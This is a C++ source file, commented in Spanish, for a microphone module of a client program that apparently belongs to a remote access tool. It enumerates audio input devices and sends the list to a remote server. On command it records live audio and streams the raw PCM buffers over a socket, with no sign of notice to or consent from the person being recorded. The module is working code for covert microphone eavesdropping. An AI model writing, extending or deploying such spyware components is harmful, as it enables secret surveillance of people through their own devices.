#include "mod_mic.hpp"

constexpr int NUM_BUFFERS = 2;
constexpr int SAMPLE_RATE = 11025; // 7.0khz
constexpr int NUM_CHANNELS = 2;
constexpr int BITS_PER_SAMPLE = 16;

constexpr int BUFFER_SIZE = SAMPLE_RATE * NUM_CHANNELS * BITS_PER_SAMPLE / 8; //un segundo

extern Cliente* cCliente;

std::vector<std::string> Mod_Mic::m_ObtenerDispositivos() {
    
    std::vector<std::string> vcOut;
    for (int i = 0; i < int(waveInGetNumDevs()); i++) {
        WAVEINCAPS wvMic;
        MMRESULT mRes = waveInGetDevCaps(i, &wvMic, sizeof(wvMic));
        if (mRes != MMSYSERR_BADDEVICEID && mRes != MMSYSERR_NOMEM) {
            std::string strDevice = "[";
            strDevice += std::to_string(i);
            strDevice.append(1, ']');
            strDevice += wvMic.szPname;
            vcOut.push_back(strDevice);
#ifdef ___DEBUG_
            std::cout << strDevice << std::endl;
#endif
        }
    }

    return vcOut;
}

void Mod_Mic::m_Enviar_Dispositivos() {
    
    std::vector<std::string> vc_devices = this->m_ObtenerDispositivos();
    std::string strSalida = "";

    if (vc_devices.size() > 0) {
        strSalida = std::to_string(EnumComandos::Mic_Refre_Resultado);
        strSalida.append(1, CMD_DEL);
        for (auto strDevice : vc_devices) {
            strSalida += strDevice;
            strSalida.append(1, CMD_DEL);
        }
        strSalida = strSalida.substr(0, strSalida.size() - 1);
        cCliente->cSend(this->sckSocket, strSalida.c_str(), strSalida.size() + 1, 0, false);
    }
    else {
        strSalida = "No hay dispositivos";
    }

    int iSent = cCliente->cSend(this->sckSocket, strSalida.c_str(), strSalida.size() + 1, 0, false);

}

void Mod_Mic::m_EmpezarLive() {
    this->isLiveMic = true;

    this->thLiveMic = std::thread(&Mod_Mic::m_LiveMicTh, this);
}

void Mod_Mic::m_DetenerLive() {
    std::unique_lock<std::mutex> lock(this->mic_mutex);
    this->isLiveMic = false;
    lock.unlock();

    if (this->thLiveMic.joinable()) {
        this->thLiveMic.join();
    }
}

void Mod_Mic::m_LiveMicTh() {
#ifdef ___DEBUG_
    std::cout << "[!] thLiveMic iniciada, dispositivo#: "<<this->p_DeviceID<< std::endl;
#endif //___DEBUG_
    
    // Definir el formato de audio
    WAVEFORMATEX wfx = {};
    wfx.wFormatTag = WAVE_FORMAT_PCM;
    wfx.nChannels = NUM_CHANNELS;
    wfx.nSamplesPerSec = SAMPLE_RATE;
    wfx.wBitsPerSample = BITS_PER_SAMPLE;
    wfx.nBlockAlign = wfx.wBitsPerSample * wfx.nChannels / 8;
    wfx.nAvgBytesPerSec = wfx.nBlockAlign * wfx.nSamplesPerSec;

    // Abrir el dispositivo de grabación
    
    HWAVEIN wi;
    if (waveInOpen(&wi, this->p_DeviceID, &wfx, (DWORD_PTR)nullptr, (DWORD_PTR)nullptr, CALLBACK_NULL | WAVE_FORMAT_DIRECT) != MMSYSERR_NOERROR) {
#ifdef ___DEBUG_
        std::cout << "Error abriendo " << this->p_DeviceID << " para grabar" << std::endl;
        error();
#endif // ___DEBUG_

        return;
    }

    
  // Crear buffers de audio
    char** buffers = new char*[NUM_BUFFERS];
    WAVEHDR* headers = new WAVEHDR[NUM_BUFFERS];

    for (int i = 0; i < NUM_BUFFERS; ++i) {
        buffers[i] = new char[BUFFER_SIZE];
        //ZeroMemory(buffers[i], BUFFER_SIZE);
        headers[i].lpData = buffers[i];
        headers[i].dwBufferLength = BUFFER_SIZE;
        waveInPrepareHeader(wi, &headers[i], sizeof(headers[i]));
        waveInAddBuffer(wi, &headers[i], sizeof(headers[i]));
    }

    // Iniciar grabación
    if (waveInStart(wi) != MMSYSERR_NOERROR) {
#ifdef ___DEBUG_
        std::cout << "Error abriendo al iniciar la grabacion" << std::endl;
        error();
#endif // ___DEBUG_
        waveInClose(wi);
        return;
    }

    //Real time
    // Bucle principal de captura y envío de audio
    std::string strHeader = std::to_string(EnumComandos::Mic_Live_Packet);
    strHeader.append(1, CMD_DEL);
    int iHeaderSize = strHeader.size();
    int iBuffsize = BUFFER_SIZE + iHeaderSize;
    char* newBuffer = new char[iBuffsize];
    while (this->isLiveMic) {
        for (int i = 0; i < NUM_BUFFERS; i++) {
            WAVEHDR& h = headers[i];
            if (h.dwFlags & WHDR_DONE) {
                // Enviar datos de audio al servidor
                ZeroMemory(newBuffer, iBuffsize);

                std::memcpy(newBuffer, strHeader.c_str(), iHeaderSize);
                std::memcpy(newBuffer + iHeaderSize, h.lpData, h.dwBufferLength);
                
                int iSent = cCliente->cSend(this->sckSocket, newBuffer, iBuffsize, 0, false);
#ifdef ___DEBUG_
                std::cout << "AUDIO " << iSent << " bytes sent\n";
#endif
                //Sleep(50);
                
                h.dwFlags = 0;
                h.dwBytesRecorded = 0;
                waveInPrepareHeader(wi, &h, sizeof(h));
                waveInAddBuffer(wi, &h, sizeof(h));
            }
        }
    }


    // Detener y limpiar la grabación
    waveInStop(wi);
    for (int i = 0; i < NUM_BUFFERS; i++) {
        WAVEHDR& h = headers[i];
        waveInUnprepareHeader(wi, &h, sizeof(h));
    }
    waveInClose(wi);

    if (newBuffer) {
        delete[] newBuffer;
        newBuffer = nullptr;
    }

    delete[] headers;
    for (int i = 0; i < NUM_BUFFERS; i++) {
        delete[] buffers[i];
    }
    delete[] buffers;


#ifdef ___DEBUG_
    std::cout << "[!] thLiveMicTh finalizada" << std::endl;
#endif // ___DEBUG_

}